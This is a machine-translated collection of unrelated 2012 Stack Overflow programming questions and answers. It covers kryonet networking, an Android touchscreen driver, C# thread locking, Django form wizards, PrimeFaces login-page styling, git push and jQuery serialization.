让我告诉你，通常服务器和客户端是完全不同的应用程序，有时让用户托管服务器是不可行的，因为它可能涉及配置防火墙等。

所以GameServer应该扩展Listener，创建kryonet的Server的实例，并将自己作为监听器添加到服务器中。GameClient 应该类似地扩展 Client，创建 kryonet 的 Client 实例，并将其自身添加为客户端的侦听器。

如果您将当前游戏状态类的引用传递给 GameClient，GameClient 可以与其通信并告诉它要渲染什么，然后游戏状态可以告诉客户端发送什么作为输入。类似地，如果您将当前游戏状态类的引用传递给 GameServer，则服务器可以为游戏逻辑提供输入，然后游戏逻辑可以告诉服务器将什么发送给客户端。

我建议在 IP 环回上创建一个简单的消息传递程序来熟悉 kryonet。

# android - 触摸屏在 beagleboard xM 上的 android 中不起作用

> ID：13822959
> 
> 赞同：3
> 
> 时间：2012-12-11T15:24:31.627
> 
> 标签：android, touchscreen, beagleboard

我有一个在 Beagleboard xM 上运行的自定义 Android (2.3)。目前，我们正在尝试用更大的电容式触摸屏替换小型电阻式触摸屏。但是，我们似乎无法使用我们的 android 进行操作。（电阻总是工作正常）。

内核模块已加载，驱动程序正在运行。按下屏幕时，驱动程序会输出正确的触摸坐标。

/proc/bus/input/devices 包含以下条目：

```
I: Bus=0003 Vendor=0eef Product=7458 Version=0210
N: Name="eGalax Inc. eGalaxTouch EXC7200-7458"
P: Phys=usb-ehci-omap.0-2.3/input0
S: Sysfs=/devices/platform/ehci-omap.0/usb1/1-2/1-2.3/1-2.3:1.0/input/input2
U: Uniq=
H: Handlers=
B: EV=1b
B: KEY=421 0 30001 0 0 0 0 0 0 0 0
B: ABS=100 3f
B: MSC=10

I: Bus=0006 Vendor=0eef Product=0020 Version=0001
N: Name="eGalaxTouch Virtual Device for Multi"
P: Phys=
S: Sysfs=/devices/virtual/input/input5
U: Uniq=
H: Handlers=event2 
B: EV=b
B: KEY=400 0 0 0 0 0 0 0 0 0 0
B: ABS=6608000 1000003

I: Bus=0006 Vendor=0eef Product=0010 Version=0001
N: Name="eGalaxTouch Virtual Device for Single"
P: Phys=
S: Sysfs=/devices/virtual/input/input6
U: Uniq=
H: Handlers=event3 
B: EV=b
B: KEY=30000 0 0 0 0 0 0 0 0
B: ABS=3 
```

根据设备指南，这是正确的。

当触摸屏幕时，android 在 logcat 中显示：

```
V/EventHub(10978): /dev/input/event2 got: t0=1594, t1=229858, type=0, code=0, v=0
D/InputReader(10978): Input event: device=0x10002 type=0x0 scancode=0 keycode=0 value=0
V/EventHub(10978): /dev/input/touchscreen0 got: t0=1594, t1=235198, type=3, code=53, v=788
D/InputReader(10978): Input event: device=0x10001 type=0x3 scancode=53 keycode=53 value=788
V/EventHub(10978): /dev/input/event2 got: t0=1594, t1=235198, type=3, code=53, v=788
D/InputReader(10978): Input event: device=0x10002 type=0x3 scancode=53 keycode=53 value=788
V/EventHub(10978): /dev/input/touchscreen0 got: t0=1594, t1=235382, type=3, code=54, v=1512
D/InputReader(10978): Input event: device=0x10001 type=0x3 scancode=54 keycode=54 value=1512
V/EventHub(10978): /dev/input/event2 got: t0=1594, t1=235382, type=3, code=54, v=1512
D/InputReader(10978): Input event: device=0x10002 type=0x3 scancode=54 keycode=54 value=1512
V/EventHub(10978): /dev/input/touchscreen0 got: t0=1594, t1=235473, type=3, code=0, v=788
D/InputReader(10978): Input event: device=0x10001 type=0x3 scancode=0 keycode=0 value=788 
```

这似乎也是正确的，代码 53 和 54 用于 X 和 Y 坐标。

然而，android UI 对触摸输入没有反应。既不是我们自己的应用程序，也不是来自开发工具的指针绘制器。事件是否未转发到输入调度程序？问题似乎出在android方面，但我无法弄清楚。

我希望有人可以在那里帮助我，或者至少告诉我在哪里可以找到更多信息。

# c# - 主线程计时器与线程

> ID：13822962
> 
> 赞同：0
> 
> 时间：2012-12-11T15:24:45.157
> 
> 标签：c#, asp.net, multithreading, wcf

我有一个在主线程上启动计时器的 Windows 服务。计时器的工作是将 xml 文件加载到内存，对值进行一些处理并将结果保存回文件。例如，处理可能需要 10 分钟。（让我们将此操作称为 A）

我还有一个线程通过 WCF 在更新 xml 文件的同一服务上生成。（让我们称之为操作B）

发生的情况是操作 A 正在运行，而操作 B 在操作 A 完成之前运行到完成。最终结果是操作 A 覆盖了操作 B 完成的所有工作。

所以我认为我需要做的是：

1.  当操作 A 开始时，如果操作 B 正在运行，则等待操作 B 完成然后执行操作 A

2.  当操作 B 启动时，如果操作 A 正在运行，则等待操作 A 完成然后执行操作 B

如果我能做到这一点，我认为我不会有问题。

我希望这是有道理的——我的等待理论是做到这一点的最好方法吗？我怎样才能在 c# 中做到这一点（或任何最好的方法）？

谢谢达摩

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T15:27:59.593

这可以通过使用`lock`C# 中的语句轻松解决。

您所需要的只是两个代码段都可以访问的某个对象的实例（类型无关紧要）。

```
public static void MethodA(object lockObject)
{
    lock(lockObject)
    {
        //code that needs to be accessed by just one thread
    }
}

public static void MethodB(object lockObject)
{
    lock(lockObject)
    {
        //code that needs to be accessed by just one thread
    }
} 
```

如果这两个操作都是从计时器触发的，您应该确保添加额外的等待不会将您推到执行代码花费的时间超过计时器间隔的地步；如果你这样做了，你最终会比它们完成更快地启动新代码，并且总会有越来越多的实例在运行。（如果先前的任务仍在运行，则可以通过让它不执行任何操作来解决此问题。）

# c# - 我有一个创建每个位图的直方图的函数。如何为每个位图的 RGB 创建另外 3 个直方图？

> ID：13822963
> 
> 赞同：0
> 
> 时间：2012-12-11T15:24:45.360
> 
> 标签：c#

这是我今天使用的直方图函数，如果我没记错的话，它是用灰色创建一个直方图。

我想要的是另一个函数，它将返回每个位图的 3 个直方图：

第一个直方图是位图的红色，第二个是绿色，最后一个是蓝色。

```
public static long[] GetHistogram(Bitmap b)
        {
            long[] myHistogram = new long[256]; 
            BitmapData bmData = null;

            try
            {
                //Lock it fixed with 32bpp
                bmData = b.LockBits(new Rectangle(0, 0, b.Width, b.Height), ImageLockMode.ReadOnly, PixelFormat.Format32bppArgb);
                int scanline = bmData.Stride;
                System.IntPtr Scan0 = bmData.Scan0;
                unsafe
                {
                    byte* p = (byte*)(void*)Scan0;
                    int nWidth = b.Width;
                    int nHeight = b.Height;
                    for (int y = 0; y < nHeight; y++)
                    {
                        for (int x = 0; x < nWidth; x++)
                        {
                            long Temp = 0;
                            Temp += p[0]; //  p[0] - blue, p[1] - green , p[2]-red
                            Temp += p[1];
                            Temp += p[2];
                            Temp = (int)Temp / 3;
                            myHistogram[Temp]++;
                            //we do not need to use any offset, we always can increment by pixelsize when
                            //locking in 32bppArgb - mode
                            p += 4;
                        }
                    }
                }
                b.UnlockBits(bmData);
            }
            catch
            {
                try
                {
                    b.UnlockBits(bmData);
                }
                catch
                {
                }
            }
            return myHistogram;
       } 
```

我该怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:29:30.733

在您指定的部分

```
Temp += p[0]
... 
```

将三个值放入单独的直方图中：

```
histB[p[0]]++;
histG[p[1]]++;
histR[p[2]]++; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T17:02:07.173

您可以使用锯齿状数组（数组数组），其中 p[0],p[1],p[2] 中的值可以放入锯齿状数组中。然后使用锯齿状数组的索引值。

希望这可以帮助

# javascript - Aptana 中的自动完成功能

> ID：13822966
> 
> 赞同：4
> 
> 时间：2012-12-11T15:24:58.757
> 
> 标签：javascript, jquery, eclipse, ide, aptana

我正在使用 Aptana studio 3 进行网络编程。我也出于同样的目的使用 jQuery。问题在于 Aptana 中的自动完成功能。例如我得到这个：

```
$('div').click(function() {
     ${0:
\}}); 
```

而不是这个：

```
$('div').click(function() {

}); 
```

也许有一些方法可以改变它（其他 jquery aoutocomplete 选项也会发生同样的情况）。谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-14T08:15:55.850

我在尝试键入`$.ajax...`Aptana 时发生了类似的事情会插入`Array(...`

我发现我需要安装 jQuery 包！

打开命令菜单 > 包开发 > 安装包

在“选择要安装的包”窗口中，选择 jQuery 并点击 OK。就是这样！您可能需要重新启动 Aptana。

希望这可以帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-21T07:22:05.907

尝试使用最新*的 vsdoc*文件并将其用于代码完成。最新的可以在[这里](http://appendto.com/community/jquery-vsdoc/)找到。另请检查以下相关[问题](https://stackoverflow.com/questions/4721124/how-to-enable-jquery-support-in-aptana-studio-3)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-21T18:38:04.520

我不知道这是否适合你，但如果你只使用 JavaScript 和 jQuery，你可以尝试一下。[https://github.com/JockiHendry/aptanastudio-contentassist-patch](https://github.com/JockiHendry/aptanastudio-contentassist-patch)

# c# - 单选按钮列表中的图像

> ID：13822972
> 
> 赞同：0
> 
> 时间：2012-12-11T15:25:07.147
> 
> 标签：c#, asp.net, image, radiobuttonlist

我有一个页面，人们需要从单选按钮列表中进行选择。我阅读了关于将图像添加到复选框列表的变体，但它对我不起作用。本质上，我的 DAL（数据访问层）中有一个数据源，我调用它来驱动我的单选按钮列表 - 当我将图像添加到其中时，我只会显示一个图像（取决于我如何这样做，每次都会出现相同的图像）。

这是我的代码：（为什么我不能让它显示所有图像？）

```
using (MyDataConnection db = new MyDataConnection())
{
    var dt = db.LogoSelectionTableCollection.GetAllAsDataTable();

    foreach (DataRow drow in dt.Rows)
    {
        //get values
        drow["LogoName"] = dt.Rows[0]["LogoName"].ToString();
        drow["LogoValue"] = dt.Rows[0]["LogoValue"].ToString();

        //assign values
        var dtVal = drow["LogoValue"].ToString();
        var dtName = drow["LogoName"].ToString();

        //filename and file path
        var fileName = dtVal.Replace(".pdf", ".jpg");
        var filePath = "/imageUrl/TempImg/" + fileName;

        //add to radio button list
        rdbtnlistLogoSelect.Items.Add(
            new ListItem(
            string.Format(
                "<img src='{0}' alt='" + dtName +
                "' width='38px' style='padding-left:4px; padding-right:4px;' align='middle' /><br />" +
                dtName + "", filePath), dtVal));
    }
} 
```

那么，为什么它不起作用？我究竟做错了什么？

# python - 用于编辑模型的 Django 表单向导

> ID：13822975
> 
> 赞同：10
> 
> 时间：2012-12-11T15:25:18.150
> 
> 标签：python, django

我有一个 Django 表单向导，可以很好地创建我的一个模型的内容。我想使用相同的向导来编辑现有内容的数据，但找不到一个很好的例子来说明如何做到这一点。

这是我的项目代码的简化版本：

表格.py

```
class ProjectEssentialsForm(forms.ModelForm):
    class Meta:
        model = Project
        fields = [
            'title',
            'short_description',
            'who_description',
            'problem_description',
            'solution_description'
        ]

class ProjectYourInfoForm(forms.ModelForm):
    class Meta:
        model = Project
        fields = [
            'gender',
            'location',
            'post_code',
            'sector',
        ] 
```

视图.py

```
TEMPLATES = {
    'project_essentials': 'projects/essentials-form.html',
    'project_your_info': 'projects/your-info-form.html',
}

class ProjectWizard(SessionWizardView):
    instance = None

    def get_form_instance(self, step):
        """
        Provides us with an instance of the Project Model to save on completion
        """
        if self.instance is None:
            self.instance = Project()
        return self.instance

    def done(self, form_list, **kwargs):
        """
        Save info to the DB
        """
        project = self.instance
        project.save()

    def get_template_names(self):
        """
        Custom templates for the different steps
        """
        return [TEMPLATES[self.steps.current]] 
```

网址.py

```
FORMS = [
    ('project_essentials', ProjectEssentialsForm),
    ('project_your_info', ProjectYourInfoForm),
]

urlpatterns = patterns('',
    (r'^projects/add$', ProjectWizard.as_view(FORMS)),
) 
```

我看到有这个功能[https://docs.djangoproject.com/en/dev/ref/contrib/formtools/form-wizard/#django.contrib.formtools.wizard.views.WizardView.get_form_instance](https://docs.djangoproject.com/en/dev/ref/contrib/formtools/form-wizard/#django.contrib.formtools.wizard.views.WizardView.get_form_instance)用于设置表单实例，但我不确定您将如何获取模型 ID 以在此处进行查找以及代码的确切工作方式。

一个代码示例或一个链接将不胜感激。

谢谢，皮特

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-12-11T16:50:59.823

我刚刚完成了这项工作，因此会发布答案以防万一它对其他人有所帮助。

您可以像这样在 urls.py 中传递要编辑的项目的 ID：

```
(r'^projects/edit/(?P<project_id>[-\d]+)$', ProjectWizard.as_view(FORMS)), 
```

然后，您可以使用以下代码查找项目

视图.py：

```
class ProjectWizard(SessionWizardView):
    def get_form_initial(self, step):
        if 'project_id' in self.kwargs and step == 'project_essentials':
            project_id = self.kwargs['project_id']
            project = Project.objects.get(id=project_id)
            from django.forms.models import model_to_dict
            project_dict = model_to_dict(project)
            return project_dict
        else:
            return self.initial_dict.get(step, {}) 
```

您需要将模型转换为字典，以便将其设置为初始数据。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2015-01-06T20:45:23.057

pxg 的回答是不够的。正如 emin-buğra-saral 所指出的，它会创建模型的一个新实例，而不是对其进行编辑。而 emin-buğra-saral 的回答本身是不够的。不要覆盖*get_form_initial*方法并且不要设置 initial_dict 值或使用此答案中提供的实现。这就是你应该如何结合他们的答案：

在 urls.py 中：

`(r'^projects/edit/(?P<project_id>[-\d]+)$', ProjectWizard.as_view(FORMS)),`

在views.py中：

```
class ProjectWizard(SessionWizardView):
    def get_form_initial(self, step):
        if 'project_id' in self.kwargs:
            return {}
        return self.initial_dict.get(step, {})

    def get_form_instance(self, step):
        if not self.instance:
            if 'project_id' in self.kwargs:
                project_id = self.kwargs['project_id']
                self.instance = Project.objects.get(id=project_id)
            else:
                self.instance = Project()
        return self.instance 
```

虽然 pxg 的 get_form_initial 版本*实际上*可以工作（只要您还添加了*get_form_instance*覆盖），但不必查找实例、提取其数据并创建初始值字典。*所有这些都是在从initial_dict*初始化实例之前由 ModelForm 自动完成的。通过简单地返回一个空的初始值字典，您将拥有更简单、更高效的代码。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2014-02-19T10:22:23.260

除了 pxg 的答案，get_form_instance 应该是这样的，否则您将不会编辑模型，而是创建它的新实例：

```
def get_form_instance(self, step):
    if not self.instance:
        if 'initial_id' in self.kwargs:
            initial_id = self.kwargs['initial_id']
            self.instance = Project.objects.get(id=initial_id)
        else:
            self.instance = Project()

    return self.instance 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2018-02-19T02:10:12.047

我不得不稍微编辑一下，让它在 Django 1.11 和 django-formtools 2.1 中工作。

```
class ProjectWizard(SessionWizardView):
    def get_form_initial(self, step):
        if 'project_id' in self.kwargs:
            return {}
        return self.initial_dict.get(step, {})

    def get_form_instance(self, step):
        if not self.instance_dict:
            if 'project_id' in self.kwargs:
                project_id = self.kwargs['project_id']
                return Project.objects.get(id=project_id)
        return None 
```

该`get_form_instance`方法现在期望[返回一个对象或 None](https://django-formwizard.readthedocs.io/en/feature-backport/gettingstarted.html#WizardView.get_form_instance)。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-09-16T16:12:45.427

适用于 Django 3.1 和 django-formtools 2.2 的更新。就我而言，我有两个模型（Colaborattor 和 User），通过 OneToOneField 连接。我在步骤 0 中显示用户表单，在步骤 1 中显示合作者表单：

模型.py：

```
class Colaborattor(models.Model):
    user = models.OneToOneField(User, on_delete=models.CASCADE)
    nome = models.CharField("Nome completo", max_length=128)
    ... 
```

视图.py：

```
class UpdateColaborattorWizard(SessionWizardView):
    form_list = [forms.UserRegisterForm, forms.ColaborattorForm]
    template_name = "criar_colaborador.html"

    def get_form_instance(self, step):
        # step 0: user form
        if 'colaborattor_pk' in self.kwargs and step == '0':
            colaborattor_pk = self.kwargs['colaborattor_pk']
            colaborattor = models.Colaborattor.objects.get(pk=colaborattor_pk)
            user = colaborattor.user
            return user
        # step 1: colaborattor form
        elif 'colaborattor_pk' in self.kwargs and step == '1':
            colaborattor_pk = self.kwargs['colaborattor_pk']
            colaborattor = models.Colaborattor.objects.get(pk=colaborattor_pk)
            return colaborattor
        # The default implementation
        return self.instance_dict.get(step, None) 
```

我希望它可以帮助有同样问题的人。

# jsf - PrimeFaces CSS 皮肤未显示在登录页面中，还有 JavaScript 未定义错误

> ID：13822978
> 
> 赞同：3
> 
> 时间：2012-12-11T15:25:26.200
> 
> 标签：jsf, jsf-2, primefaces, look-and-feel, login-page

我在我的 web 应用程序中使用 PrimeFaces 3.4，对于特定页面，控件不会显示为正常的 PrimeFaces 皮肤：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"
    xmlns:h="http://java.sun.com/jsf/html"
    xmlns:f="http://java.sun.com/jsf/core"
    xmlns:ui="http://java.sun.com/jsf/facelets"
    xmlns:p="http://primefaces.org/ui">
<h:head>
    <title>VMS login</title>
</h:head> 
<h:body> 
  <h:form id="loginForm">
    <p:messages id="messages" showDetail="true" autoUpdate="true" closable="true" />  
    <p:panel header="#{msgs['login.title']}">
      <p:panelGrid id="loginPanel" columns="2">
        <h:outputText value="#{msgs['login.username']}" />
        <p:inputText id="j_username" value="#{loginFormBean.userName}" required="true"></p:inputText>
        <p:message for="j_username" ></p:message>
        <h:outputText value="#{msgs['login.password']}" />
        <p:password id="j_password" value="#{loginFormBean.password}" required="true" feedback="false"></p:password>
        <p:message for="j_password"></p:message>
        <p:commandButton action="#{loginController.loginUsingSpringAuthenticationManager}" value="#{msgs['login.button']}" update="loginForm" ajax="true"></p:commandButton>
      </p:panelGrid>
    </p:panel>
  </h:form>
</h:body>
</html> 
```

这输出到：

![在此处输入图像描述](../Images/90391a055124ef9c2ee43ca64a9b0bfd.png)

面板应该有一个标题等等。

有趣的是，在另一个页面中，我`<p:layout>`在布局中使用了不同的面板，它们以正常的 PrimeFaces 外观显示得很好。

我究竟做错了什么？谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-11T15:35:38.537

鉴于它只发生在登录页面上，当身份验证机制还启动对 CSS/JS/图像文件等 JSF 资源的请求并将它们也重定向到登录页面时，就会发生这种情况。然后，网络浏览器将检索登录页面的 HTML 表示，而不是具体资源。如果您在 webbrowser 的开发人员工具集中调查过 HTTP 流量，那么您也应该注意到这一点。

如果您使用带有 servlet 过滤器的本地身份验证，那么您需要告诉过滤器不要将它们重定向到登录页面，而只是继续它们。就是那些`/javax.faces.resource/*`URL（您可以通过 将 URL 路径设为常量[`ResourceHandler#RESOURCE_IDENTIFIER`](http://docs.oracle.com/javaee/6/api/javax/faces/application/ResourceHandler.html#RESOURCE_IDENTIFIER)）。

```
if (request.getRequestURI().startsWith(request.getContextPath() + ResourceHandler.RESOURCE_IDENTIFIER)) {
    chain.doFilter(request, response);
    return;
}

// ... 
```

或者，如果您使用的是容器管理的身份验证，那么您应该添加`/javax.faces.resource/*`到允许的 URL，这些 URL 应该从登录检查中跳过：

```
<security-constraint>
    <web-resource-collection>
        <web-resource-name>Allowed resources</web-resource-name>
        <url-pattern>/javax.faces.resource/*</url-pattern>
    </web-resource-collection>
    <!-- No Auth Contraint! -->
</security-constraint> 
```

另请参阅[在 web.xml 安全约束中排除 css 和图像资源](https://stackoverflow.com/questions/13696204/exclude-css-image-resources-in-web-xml-security-constraint)。

或者当您使用像 Spring Security 这样的 3rd 方身份验证框架时，您需要通过以下方式告诉它（假设 3.1.0 或更高版本）

```
<http security="none" pattern="/javax.faces.resource/**" /> 
```

另请参阅[Spring Security 3.0.5](https://stackoverflow.com/questions/5447499/spring-security-3-0-5)。

或者，当您使用 PicketLink 时，请参阅[基于 PrimeFaces 的应用程序 with PicketLink does not show style in login page](https://stackoverflow.com/questions/28373178/primefaces-based-application-with-picketlink-does-not-show-style-in-login-page)。

# iphone - iPhone：如何将 UITextField 和 UITableView 放在同一个视图上？推荐方式

> ID：13822983
> 
> 赞同：1
> 
> 时间：2012-12-11T15:25:31.900
> 
> 标签：iphone, objective-c, ios, ipad, uitableview

我是IOS开发的新手。我想创建如图所示的视图。

我还希望当用户在文本字段中写入并且键盘出现 TextField 向上滚动到键盘时，应该隐藏在键盘后面。

![在此处输入图像描述](../Images/7b5fd86abe52c9bb6fc984f8516eefa3.png) 谢谢，请帮忙

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:33:18.743

您可能希望在页脚内添加文本字段和按钮。您可以使用键盘通知来移动视图偏移量，以便在用户键入键盘时可以看到您的文本字段。

页脚：*我假设文本字段和发送按钮是 ivars。

```
// add footer to table
UIView *footerView = [[UIView alloc] initWithFrame:CGRectMake(0.0f, 0.0f, self.view.frame.size.width, 85.0f)];
if(yourTextField ==nil){
     yourTextField = [[UITextField alloc] initWithFrame:CGRectMake(5,5,200,35)];
}
if(yourSendButton ==nil){
     yourSendButton = [[UIButton alloc] initWithFrame:CGRectMake(225,5,75,35)];
     yourSendButton addTarget:self action:@selector(sendBtnClicked) forControlEvents:UIControlEventTouchUpInside];
}

[footerView addSubview:yourTextField];
[footerView addSubview:yourSendButton];
[tableView setTableFooterView:footerView]; 
```

下面是一些用于移动键盘视图的示例代码：

```
- (void)keyboardWillShow:(NSNotification *)notification
{
    NSValue *keyboardFrameValue = [[notification userInfo] objectForKey:UIKeyboardFrameEndUserInfoKey];
    CGRect keyboardFrame = [[self view] convertRect:[keyboardFrameValue CGRectValue] fromView:nil];
    NSNumber *duration = [[notification userInfo] objectForKey:UIKeyboardAnimationDurationUserInfoKey];
    [UIView animateWithDuration:[duration floatValue] animations:^{
        [scrollView setFrame:CGRectMake(scrollView.frame.origin.x,
                                        scrollView.frame.origin.y, 
                                        scrollView.frame.size.width, 
                                        keyboardFrame.origin.y - scrollView.frame.origin.y)];

    }];
}

- (void)keyboardWillHide:(NSNotification *)notification
{
    NSNumber *duration = [[notification userInfo] objectForKey:UIKeyboardAnimationDurationUserInfoKey];
    [UIView animateWithDuration:[duration floatValue] animations:^{
        [scrollView setFrame:CGRectMake(scrollView.frame.origin.x,
                                        scrollView.frame.origin.y, 
                                        scrollView.frame.size.width, 
                                        self.view.frame.size.height - (iPhone ? 44.0f : 0.0f))];
    }];
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-11T15:47:19.007

您将需要实现 UITableView 的委托方法：

```
- (UIView *)tableView:(UITableView *)tableView viewForFooterInSection:(NSInteger)section;
- (CGFloat)tableView:(UITableView *)tableView heightForFooterInSection:(NSInteger)section; 
```

将文本字段添加到页脚的示例如下所示：

```
- (UIView *)tableView:(UITableView *)tableView viewForFooterInSection:(NSInteger)section;
{
  UIView* footer = [[[UIView alloc] initWithFrame:CGRectMake(0, 0, 320, 44)] autorelease];
  footer.backgroundColor = [UIColor whiteColor];

  UITextField* field = [[[UITextField alloc] initWithFrame:CGRectMake(0, 0, 320, 44)] autorelease];
  [field setBorderStyle:UITextBorderStyleBezel];
  [footer addSubview:field];
  return footer;
}
- (CGFloat)tableView:(UITableView *)tableView heightForFooterInSection:(NSInteger)section;
{
  return 44;
} 
```

要让键盘自动正确响应 - 您只需要在完成后退出文本字段。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-11T15:56:40.017

您不能使用`UITableViewController`标准视图控制器并在控制器中实现`UITableViewDelegate`和`UITableViewDataSource`实现必要的委托方法，例如`cellForRowAtIndexPath`.

这将允许您拥有一个表格视图并像使用 a 一样控制它，`UITableViewController`并拥有您希望的任何其他界面元素。

# jbehave - 动态生成 jbehave 故事

> ID：13822987
> 
> 赞同：1
> 
> 时间：2012-12-11T15:25:44.087
> 
> 标签：jbehave

我们计划通过在一个简单的 Web 表单中输入 when then 命令 (?) 来动态生成 JBehave 故事。我不确定，如果我喜欢这个主意。我的意思是，我可以在开始测试之前以编程方式保存 .story 文件，并在覆盖的 StoryPathResolver.resolve 方法中指向该文件。但是，你认为这很有意义吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-25T18:22:17.427

我不确定我是否理解您计划的功能，但根据我的假设 *)，我说：不，由于以下原因，它没有意义。

我在这里对此的假设是您想即时执行（测试）系统和/或您不知道如何事先测试什么。但无论哪种方式，输入的任何内容都不能在以后的回归测试中重现，自动化测试带来的任何其他典型好处都将适用，首先是速度。

与其实现这样一个框架，它会在每个步骤中为您提供可用的选项以及所需的走走停停系统，不如优化编写 .story 文件的路径并将它们注入一个正在运行的系统。这样，作者仍然可以花时间指定示例，并从一开始就使它们可重现。

*）如果我错了，请改写你的问题。我可以在您的第一篇文章中扣除其他一些问题。

# git - 使用 ssh 时使用 git 客户端发送环境变量

> ID：13822990
> 
> 赞同：0
> 
> 时间：2012-12-11T15:25:46.727
> 
> 标签：git, ssh, environment-variables

我希望能够在调用时发送一个环境变量，例如 git clone over ssh：

git clone ssh://host.example/project

我知道这可以通过在 ~/.ssh/config 中为 host.example 设置 SendEnv 来实现。虽然我想避免修改任何文件。例如，只有 ssh 我们可以这样做：

ssh -o SendEnv=MYVAR server.example.com mycommand

并且不需要修改文件。在 ssh 上使用 git clone 时是否有类似的方法来实现这一点？

干杯!

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T21:20:47.227

一个 Bash shell 函数可以做到这一点：

```
function e { echo $1; GIT_SSH=$1; export GIT_SSH; } 
```

用您需要的任何 Git 功能替换“echo $1”。

# git - 无法在本地存储库上进行 git push

> ID：13822992
> 
> 赞同：1
> 
> 时间：2012-12-11T15:25:50.093
> 
> 标签：git

我使用的 Git-1.7.11-preview20120710.exe。我创建了一个 git 存储库

```
cd "GIT scm/"
git init --bare shahed.git
cd shahed.git
git update-server-info 
```

然后我通过以下命令启动 git daemon

```
git daemon --reuseaddr --base-path="E:/GIT scm/" --export-all --verbose --enable=receive-pack 
```

然后我克隆git存储库如下

```
git clone git://localhost/shahed.git

Cloning into 'shahed'...
warning: You appear to have cloned an empty repository.

cd shahed
touch shahed.txt
touch shohel.txt
git add *.*
git commit -m 'ok'

[master (root-commit) 2062f1d] 'ok'
 0 files changed
 create mode 100644 shahed.txt
 create mode 100644 shohel.txt

git push

No refs in common and none specified; doing nothing.
Perhaps you should specify a branch such as 'master'.
Everything up-to-date 
```

虽然 git 守护进程控制台记录以下消息

```
[4044] Ready to rumble
[736] Connection from [::1]:50076
[736] Extended attributes (16 bytes) exist <host=localhost>
[736] Request upload-pack for '/shahed.git'
[4044] [736] Disconnected
[4860] Connection from [::1]:50079
[4860] Extended attributes (16 bytes) exist <host=localhost>
[4860] Request receive-pack for '/shahed.git'
[4860] fatal: The remote end hung up unexpectedly 
```

但我无法 git push。有人告诉我我错过了创建 git 存储库的哪一步。我采取的所有举措都可以，或者配置git存储库的不足之处在哪里。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-11T16:09:58.013

`master`这告诉您的是，您的裸存储库中没有分支`origin`，因为它是空的。因此，它找不到您要更新的分支，并且默认情况下它不会盲目地创建一个新分支（以防它是一个错字什么的）。您可能需要`git push -f origin master`第一次使用。一旦有一个`master`分支`origin`，正常`git push`应该可以正常工作。

或者，您可以首先创建您的工作存储库，其中至少有一个提交，然后`git clone --bare`将其放入您的`git-daemon`位置，但是您随后会想要删除`origin`裸存储库中的远程规范，并且您必须手动添加它（或重新克隆）在您的工作存储库中。

# jquery - 当输入在表内时，JQuery 序列化不适用于 Internet Explorer 中的输入

> ID：13822996
> 
> 赞同：0
> 
> 时间：2012-12-11T15:26:00.803
> 
> 标签：jquery, internet-explorer

**更新：**好的，我需要被枪杀。我遗漏了一些表单代码以减少帖子的长度。这是完整的代码：

```
<form name="userupdate" id="userupdate" method="post">
<input type='hidden' name='username' id='username' value='andyd273' />
<input type='hidden' name='setusertype' id='setusertype' value='1' />
<table align="left" border="1" cellspacing="0" cellpadding="3" class="bodytext">
<tr><td>andyd273</td></tr>
<tr><td>
<input type='checkbox' name='DealerType[]' id='GM' value='1' /> GM<br>
<input type='checkbox' name='DealerType[]' id='Chrysler' value='2' /> Chrysler<br>
<input type='checkbox' name='DealerType[]' id='Ford' value='3' /> Ford<br>
</td></tr>
</table><br>
<input type='button' value='Save' onclick='javascript: formSubmit();' />
</form> 
```

我想我会尝试一些东西，然后删除*表格*内容，只留下简单的表单输入，复选框开始像在 Chrome 中一样工作。

**所以，新问题：**当输入在表内时，为什么不能在 IE 中序列化工作？感谢所有试图帮助解决第一个不完整问题的人！

**为了完整起见，老问题留下了：**

我正在尝试获取要序列化的表单。它适用于 Chrome 和 Firefox，但不适用于 Internet Explorer。
例子：

```
<input type='hidden' name='username' id='username' value='andyd273'>
<input type='hidden' name='setusertype' id='setusertype' value='1'>
<input type='checkbox' name='DealerType[]' id='GM' value='1' /> GM<br>
<input type='checkbox' name='DealerType[]' id='Chrysler' value='2' /> Chrysler<br>
<input type='checkbox' name='DealerType[]' id='Ford' value='3' /> Ford<br> 
```

在 Chrome 中我得到：

```
Array
(
    [username] => andyd273
    [setusertype] => 1
    [DealerType] => Array
        (
            [0] => 1
            [1] => 3
        )

) 
```

但在 IE 中我只得到：

```
Array
(
    [username] => andyd273
    [setusertype] => 1
) 
```

所以我不确定需要做什么才能让它在 IE 中工作。

**/老问题**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T16:04:08.783

jQuery 的序列化不包括未选中的复选框。

看看这个小提琴：

[http://jsfiddle.net/UGaEp/3/](http://jsfiddle.net/UGaEp/3/)

您可以从以下问题中找到更多信息：

[jQuery 序列化不注册复选框](https://stackoverflow.com/questions/3029870/jquery-serialize-does-not-register-checkboxes)

忽略代码，不会让我发布答案。

```
$('#test').on('click', '#submit', validate);

function validate() {
    var data = $('#test').serialize();
    console.log(data);
}​ 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-11T15:50:53.227

更新：

因为在表格元素中嵌套输入元素不是合法的 HTML 语法。不过，Chrome 和 Firefox 解决了这个“问题”，值得注意的是：Safari 并非总是如此。

要回答评论 - 如果顺序是表格 > 表格 > 等 > 输入不正确，表格 > 表格内容 > 表格 > 输入就可以了。

